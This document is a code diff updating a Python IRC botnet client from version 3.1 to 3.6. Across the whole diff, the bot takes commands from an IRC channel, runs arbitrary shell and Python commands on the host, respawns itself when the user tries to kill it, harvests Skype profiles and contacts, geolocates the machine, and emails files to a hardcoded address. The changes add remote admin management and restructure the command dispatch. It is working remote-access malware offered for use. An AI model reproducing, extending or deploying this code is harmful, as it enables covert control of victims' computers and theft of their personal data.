@@ -31,16 +31,16 @@ import skype
 #       status      returns the size of the worker's task queue
 #       openvpn     implement openvpn for firewall evasion
 
-version = "3.1"                                                 # bot version
+version = "3.6"                                                   # bot version
 
-#### Remove/comment this block to disable logging stdout/err to a file
-#so = se = open("bot_v%s.log" % version, 'w', 0)
-## re-open stdout without buffering
-#sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
-## redirect stdout and stderr to the log file
-#os.dup2(so.fileno(), sys.stdout.fileno())
-#os.dup2(se.fileno(), sys.stderr.fileno())
-#### Endblock
+### Remove/comment this block to disable logging stdout/err to a file
+so = se = open("bot_v%s.log" % version, 'w', 0)
+# re-open stdout without buffering
+sys.stdout = os.fdopen(sys.stdout.fileno(), 'w', 0)
+# redirect stdout and stderr to the log file
+os.dup2(so.fileno(), sys.stdout.fileno())
+os.dup2(se.fileno(), sys.stderr.fileno())
+### Endblock
 
 def log(prefix, content=''):                                      # function used to log things to stdout with a timestamp
     try:
@@ -58,7 +58,7 @@ port = 6667
 channel = '#skypeupdate'
 source_checking_enabled = True
 allowed_sources = ["thesquash"]                                   # only accept commands from these nicks
-admin = 'thesquash'                                               # the nick to send privmsgs to, and to check recieved message validity
+admin = 'thesquash'                                               # the nick to send privmsgs to by default
 
 hostname = socket.gethostname()                                   # host's hostname
 main_user = os.popen("stat -f '%u %Su' /dev/console | awk  '{print $2}'").read().strip()        # main user of the computer detected by current owner of /dev/console
@@ -91,15 +91,15 @@ Public Commands (main channel): \n
 
 ############ Flow functions
 
-def timeout_handler(signum, frame):                               # handler for timeout exceptions
+def timeout_handler(signum, frame):                                           # handler for timeout exceptions
     raise Exception("timedout %s %s" % (signum, frame))
 
-def sigterm_handler(signum, frame):                               # if user tries to kill python process, it will spawn another one
+def sigterm_handler(signum, frame):                                           # if user tries to kill python process, it will spawn another one
     log('[#] ----Host attempted to shutdown bot----')
     log('[#] ----Spawning subprocess----')
     privmsg("----Host attempted to shutdown bot----")
     quit_status = True
-    cmd = "sleep 15; python irc_bot.py > ./log.txt &"
+    cmd = "sleep 15; python bot.py &"
     log('[>]    CMD:     ',cmd)
     p = subprocess.Popen([cmd],shell=True,executable='/bin/bash')
     log('[#] ----Subprocess Spawned----')
@@ -131,19 +131,19 @@ def parse(data):
         from_nick = data.split("PRIVMSG ",1)[0].split("!")[0][1:] # who sent the PRIVMSG
         to_nick = data.split("PRIVMSG ",1)[1].split(" :",1)[0]  # where did they send it
         text = data.split("PRIVMSG ",1)[1].split(" :",1)[1].strip()  # what did it contain
-        if source_checking_enabled and from_nick not in allowed_sources:
-            log("[#] Not from admin. (source checking enabled)")
-            return (False,)                     # break and return nothing if message is invalid
+        if source_checking_enabled and (from_nick not in allowed_sources and from_nick != admin):
+            log("[>]     Not from an allowed source. (source checking enabled)")
+            return (False,"","")                     # break and return nothing if message is invalid
         if to_nick == channel:
-            return_to = "public"
+            source = "public"
         elif to_nick != channel:
-            return_to = from_nick
-        log("[#] Parsed: text: %s, return_to: %s, from: %s" % (text, return_to, from_nick))
-        return (text, return_to, from_nick)
+            source = from_nick
+        log("[>]     Content: %s, Source: %s, Return To: %s" % (text, source, from_nick))
+        return (text, source, from_nick)
     elif data.find("PING :",0,6) != -1:               # was it just a ping?
         from_srv = data.split("PING :")[1].strip()    # the source of the PING
-        return ("PING", from_srv)
-    return (False,)                         # break and return nothing if message is invalid
+        return ("PING", from_srv, from_srv)
+    return (False,"","")                         # break and return nothing if message is invalid
 
 def scan(match):                                                  # function to scan main channel messages for strings
     if data.find(channel) != -1 and not data.find(nick) != -1:    # checking to make sure its not a private message
@@ -160,7 +160,7 @@ def privmsg(msg=None, to=admin):                                  # function to 
     if type(msg) is unicode:
         msg = unicodedata.normalize('NFKD', msg).encode('ascii','ignore')
     elif type(msg) is not str or unicode:
-        msg = str(msg)
+        msg = str(msg).strip()
     log('[+] Sent Data:')
     if (len(msg) > 480) or (msg.find('\n') != -1):
         log('[#] Starting multiline output.')
@@ -171,12 +171,12 @@ def privmsg(msg=None, to=admin):                                  # function to 
             signal.alarm(1)                                          # doubles as flood prevention and input checking
             try:
                 data = irc.recv ( 4096 )
-                log('[+] Recieved:')
-                log('[>]    ', data)
                 if (data.find('!stop') != -1):
+                    signal.alarm(0)
+                    log('[+] Recieved:')
+                    log('[>]    ', data.strip())
                     retcode = "Stopped Output."
                     privmsg("[X]: %s" % retcode, to)
-                    signal.alarm(0)
                     break
             except:
                 pass
@@ -185,6 +185,8 @@ def privmsg(msg=None, to=admin):                                  # function to 
             signal.alarm(0)
 
         log('[#] Finished multiline output.')  
+    elif len(msg) < 1:
+        pass
     else:
         log('[<]    PRIVMSG %s :%s\r' % (to, msg))
         irc.send ('PRIVMSG %s :%s\r\n' % (to, msg))
@@ -209,22 +211,24 @@ def run_shell(cmd, timeout=60, verbose=False):                    # run a shell 
     signal.alarm(0)
     while(continue_running):
         signal.signal(signal.SIGALRM, timeout_handler)
-        signal.alarm(4)
+        signal.alarm(1)
         try:
-            signal.signal(signal.SIGALRM, timeout_handler)
-            signal.alarm(2)
-            try:
-                line = p.stdout.readline()
-                if verbose: yield(line)
-                else: yield(line.strip())
-                out += line
-            except:
-                log('[#] Checking for input.')
+            line = p.stdout.readline()
+            if verbose: yield(line)
+            else: yield(line.strip())
+            out += line
+        except:
+            pass
+        signal.signal(signal.SIGALRM, timeout_handler)
+        signal.alarm(1)
+        try:
+            log('[#] Checking for input.')
             data = irc.recv ( 4096 )
-            log('[+] Recieved:')
-            log('[>]    ', data)
             if (data.find('!cancel') != -1):
-                continue_running = 0
+                signal.alarm(0)
+                log('[+] Recieved:')
+                log('[>]    ', data.strip())
+                continue_running = False
                 retcode = "Cancelled."
                 yield("[X]: %s" % retcode)
                 os.killpg(p.pid, signal.SIGTERM)
@@ -233,7 +237,6 @@ def run_shell(cmd, timeout=60, verbose=False):                    # run a shell 
                 retcode = p.poll() #returns None while subprocess is running
         except Exception as e:
             retcode = p.poll() #returns None while subprocess is running
-            log('[#] Done Checking.')
         signal.alarm(0)
         if (retcode is not None):
             line = p.stdout.read()
@@ -269,12 +272,12 @@ def run_python(cmd):                                              # interactivel
         out = "[X]: %s" % python_exception
     return out.strip()
 
-def run(cmd, public=False):                                       # wrapper for run_shell which improves logging and responses
+def run(cmd, public=False, return_to=admin):                                       # wrapper for run_shell which improves logging and responses
     def respond(content):
         if public:
             broadcast(content)
         else:
-            privmsg(content)
+            privmsg(content,return_to)
     out = ''
     cmd = cmd.strip()
     log("[+] Ran Command:")
@@ -289,7 +292,7 @@ def run(cmd, public=False):                                       # wrapper for 
         log("\n")
 
 def sendmail(to="nikisweeting+bot@gmail.com",subj='BOT: '+nick,msg="Info",attch=[]): # function to send mail to a specified address with the given attachments
-    #do not use attch.append() http://stackoverflow.com/a/113198/2156113
+    # do not use attch.append() witin function http://stackoverflow.com/a/113198/2156113
     err = """\n
         sudo mkdir -p /Library/Server/Mail/Data/spool\n
         sudo /usr/sbin/postfix set-permissions\n
@@ -338,7 +341,9 @@ def selfupdate(git_user="nikisweeting",git_repo="violent-python"):   # updates t
             privmsg("[+] Shutting down for update. Log saved in updatelog.txt")
             quit_status = True
             irc.send ( 'QUIT\r\n' )
-            raise SystemExit(0)
+            irc.close()
+            raise SystemExit
+            sys.exit()
 
 def geo_locate(ip="",with_proxy=False):                                                   # fetch location based on IP
     signal.signal(signal.SIGALRM, timeout_handler)
@@ -485,7 +490,7 @@ if __name__ == '__main__':
                 irc.send ('NICK %s\r\n' % nick )
                 irc.send ('USER %s %s %s :%s\r\n' % (nick, nick, nick, nick))
                 irc.send ('JOIN %s\r\n' % channel)
-                privmsg('Bot v%s Running.' % version)
+                broadcast('Bot v%s Running.' % version)
                 try:
                     privmsg('Bot reloaded due to internal exception: %s' % e)
                     del e
@@ -504,7 +509,7 @@ if __name__ == '__main__':
                 try:
                     data = irc.recv(4096)
                     log('[+] Recieved:')
-                    log('[>]    ', data)
+                    log('[>]    ', data.strip())
                 except socket.timeout:
                     if (time.time() - last_ping) > threshold:        # if reciving data times out and ping threshold is exceeded, attempt a reconnect
                         log('[*] Disconnected.')
@@ -523,124 +528,170 @@ if __name__ == '__main__':
                     break
 
                 data = parse(data)
-                if data[0] != False:
-                    if data[0] == 'PING' and (len(data[1]) > 0):
-                        irc.send ('PONG ' + data[1] + '\r')
+
+                content = data[0]
+                source = data[1]
+                return_to = data[2]
+
+                if content != False:
+                    if content == 'PING' and (len(source) > 0):
+                        irc.send ('PONG ' + source + '\r')
                         last_ping = time.time()
                         log('[+] Sent Data:')
-                        log('[<]    PONG ',data[1])
+                        log('[<]    PONG ',source)
                         timeout_count = 0
 
                     ##Control keyword matches
-                    elif data[0] == '!quit' or data[0] == 'quit':
+                    elif content == '!quit' or content == 'quit':
                         privmsg('Quitting.')
                         irc.send('QUIT\r\n')
+                        irc.close()
                         quit_status = True
 
-                    elif data[0] == '!reload' or data[0] == 'reload':
-                        privmsg('Reloading.')
+                    elif content == '!reconnect' or content == 'reconnect':
+                        privmsg('Reeconnecting.')
                         irc.send('QUIT\r\n')
                         quit_status = False
                         break
 
-                    ##Simple keywords with no arguments
-                    elif data[0] == '!update'   or  data[0] == 'update':        selfupdate()
-                    elif data[0] == '!version'  and data[1] == 'public':        broadcast("v"+version)
-                    elif data[0] == '!identify' and data[1] == 'public':        broadcast(identify())
-                    elif data[0] == 'help'      and data[1] != 'public':        privmsg(helpmsg,to=data[1])
-                    elif data[0] == 'version'   and data[1] != 'public':        privmsg(version,to=data[1])
-                    elif data[0] == 'identify'  and data[1] != 'public':        full_identify()
+                    elif content == '!reload' or content == 'reload':
+                        log('[#] ----Reloading Bot----')
+                        privmsg('----Reloading Bot from file bot.py----')
+                        cmd = "sleep 5; python bot.py &"
+                        log('[>]    CMD:     ',cmd)
+                        p = subprocess.Popen([cmd],shell=True,executable='/bin/bash')
+                        log('[#] ----New Process Spawned----')
+                        privmsg('----New Process Spawned----')
+                        quit_status = True
+                        irc.send ( 'QUIT\r\n' )
+                        irc.close()
+                        raise SystemExit                                              
+                        sys.exit()
 
-                    ##Complex keywords with arguments
-                    elif data[0].find('email$') != -1 and data[1] == 'public':
-                        attch = data[0].split("$", 1)[1].split(',')
-                        to = "nikisweeting+bot@gmail.com"
-                        broadcast(sendmail(to,msg="whohooo",attch=attch))
+                    elif content == '!update' or  content == 'update':
+                        selfupdate()
 
-                    elif data[0] == '!geo' and data[1] == 'public':
-                        location = str(geo_locate())
-                        broadcast(location)
+                    elif source == 'public':
+                        if content == '!version':
+                            broadcast("v"+version)
 
-                    elif data[0] == 'geo' and data[1] != 'public':
-                        location_with_proxy = str(geo_locate(with_proxy=True))
-                        location = str(geo_locate())
-                        if location_with_proxy == location:
-                            privmsg("Location: %s" % location,to=data[1])
-                        else:
-                            privmsg("Proxy Detected: %s" % location_with_proxy,to=data[1])
-                            sleep(1)
-                            privmsg("Actual Location: %s" % location,to=data[1])
+                        elif content == '!identify':
+                            broadcast(identify())
 
-                    elif data[0] == '!skype' and data[1] == 'public':
-                        try:
-                            broadcast(skype.findProfile(local_user))
-                            db_path = skype.findProfile(local_user)
-                            for line in skype.printProfile(db_path):
-                                broadcast(line)
+                        elif content[:6] == 'email$':
+                            attch = content[6:].split(',')
+                            to = "nikisweeting+bot@gmail.com"
+                            broadcast(sendmail(to,msg="whohooo",attch=attch))
+
+                        elif content == '!geo' and source:
+                            location = str(geo_locate())
+                            broadcast(location)
+
+                        elif content == '!skype':
+                            try:
+                                broadcast(skype.findProfile(local_user))
+                                db_path = skype.findProfile(local_user)
+                                for line in skype.printProfile(db_path):
+                                    broadcast(line)
+                                    sleep(1)
+                            except Exception as error:
+                                broadcast(str(error))
+
+                        elif content[:1] == '$':
+                            cmd = content[1:]
+                            run(cmd, public=True)
+
+                        elif content[:3] == '>>>':
+                            cmd = content[3:]
+                            try:
+                                broadcast(run_python(cmd))
+                            except Exception as python_exception:
+                                broadcast("[X]: %s" % python_exception)
+
+                    elif source != 'public':
+                        if content == 'help':
+                            privmsg(helpmsg,to=source)
+
+                        elif content == 'version':
+                            privmsg("v"+version,to=source)
+
+                        elif content == 'identify':
+                            full_identify()
+
+                        elif content == 'geo':
+                            location_with_proxy = str(geo_locate(with_proxy=True))
+                            location = str(geo_locate())
+                            if location_with_proxy == location:
+                                privmsg("Location: %s" % location,to=source)
+                            else:
+                                privmsg("Proxy Detected: %s" % location_with_proxy,to=source)
                                 sleep(1)
-                        except Exception as error:
-                            broadcast(str(error))
+                                privmsg("Actual Location: %s" % location,to=source)
 
-                    elif data[0] == 'skype$profile' and data[1] != 'public':
-                        try:
-                            privmsg(skype.findProfile(local_user), to=data[1])
-                            db_path = skype.findProfile(local_user)
-                            for line in skype.printProfile(db_path):
-                                privmsg(line, to=data[1])
-                                sleep(1)
-                        except Exception as error:
-                            privmsg(str(error), to=data[1])
+                        elif content == 'skype$profile':
+                            try:
+                                privmsg(skype.findProfile(local_user), to=source)
+                                db_path = skype.findProfile(local_user)
+                                for line in skype.printProfile(db_path):
+                                    privmsg(line, to=source)
+                                    sleep(1)
+                            except Exception as error:
+                                privmsg(str(error), to=source)
 
-                    elif data[0] == 'skype$contacts' and data[1] != 'public':
-                        try:
-                            db_path = skype.findProfile(local_user)
-                            for line in skype.printProfile(db_path):
-                                privmsg(line, to=data[1])
-                                sleep(1)
-                            for line in skype.printContacts(db_path):
-                                signal.signal(signal.SIGALRM, timeout_handler)
-                                signal.alarm(1)                              # doubles as flood prevention and input checking
-                                try:
-                                    data = irc.recv ( 4096 )
-                                    log('[+] Recieved:')
-                                    log('[>]    ', data)
-                                    if (data.find('!cancel') != -1):
-                                        retcode = "Cancelled."
-                                        privmsg("[X]: %s" % retcode, to=data[1])
-                                        signal.alarm(0)
-                                        break
-                                except:
-                                    privmsg(line, to=data[1])
-                                signal.alarm(0)
+                        elif content == 'skype$contacts':
+                            try:
+                                db_path = skype.findProfile(local_user)
+                                for line in skype.printProfile(db_path):
+                                    privmsg(line, to=source)
+                                    sleep(1)
+                                for line in skype.printContacts(db_path):
+                                    signal.signal(signal.SIGALRM, timeout_handler)
+                                    signal.alarm(1)                              # doubles as flood prevention and input checking
+                                    try:
+                                        data = irc.recv ( 4096 )
+                                        log('[+] Recieved:')
+                                        log('[>]    ', data.strip())
+                                        if (data.find('!cancel') != -1):
+                                            retcode = "Cancelled."
+                                            privmsg("[X]: %s" % retcode, to=source)
+                                            signal.alarm(0)
+                                            break
+                                    except:
+                                        privmsg(line, to=source)
+                                    signal.alarm(0)
 
-                        except Exception as error:
-                            privmsg(str(error), to=data[1])
+                            except Exception as error:
+                                privmsg(str(error), to=source)
 
-                    elif data[0].find('$') != -1 and data[1] == 'public':
-                        cmd = data[0].split("$", 1)[1]
-                        run(cmd, public=True)
+                        elif content[:6] == 'admin$':
+                            admins = content[6:].split(',')
+                            for entry in admins:
+                                allowed_sources.append(entry)
+                            privmsg("Admin List: %s" % allowed_sources)
 
-                    elif data[0].find('$') != -1 and data[1] != 'public':
-                        cmd = data[0].split("$", 1)[1]
-                        run(cmd, public=False)
+                        elif content[:8] == 'unadmin$':
+                            admins = content[8:].split(',')
+                            for entry in admins:
+                                if entry in allowed_sources:
+                                    allowed_sources.remove(entry)
+                            privmsg("Admin List: %s" % allowed_sources)
 
-                    elif data[0].find('>>>') != -1 and data[1] != 'public':
-                        cmd = data[0].split(">>>", 1)[1]
-                        try:
-                            privmsg(run_python(cmd), to=data[1])
-                        except Exception as python_exception:
-                            privmsg("[X]: %s" % python_exception, to=data[1])
+                        elif content[:1] == '$':
+                            cmd = content[1:]
+                            run(cmd, public=False, return_to=return_to)
 
-                    elif data[0].find('>>>') != -1 and data[1] == 'public':
-                        cmd = data[0].split(">>>", 1)[1]
-                        try:
-                            broadcast(run_python(cmd))
-                        except Exception as python_exception:
-                            broadcast("[X]: %s" % python_exception)
+                        elif content[:3] == '>>>':
+                            cmd = content[3:]
+                            try:
+                                privmsg(run_python(cmd), return_to)
+                            except Exception as python_exception:
+                                privmsg("[X]: %s" % python_exception, return_to)
 
         except (KeyboardInterrupt, SystemExit):
             break
         except Exception as e:
             log("[#] ----EXCEPTION---- ",e)
         log("[*] EXIT")
+        raise SystemExit
+        sys.exit()
         
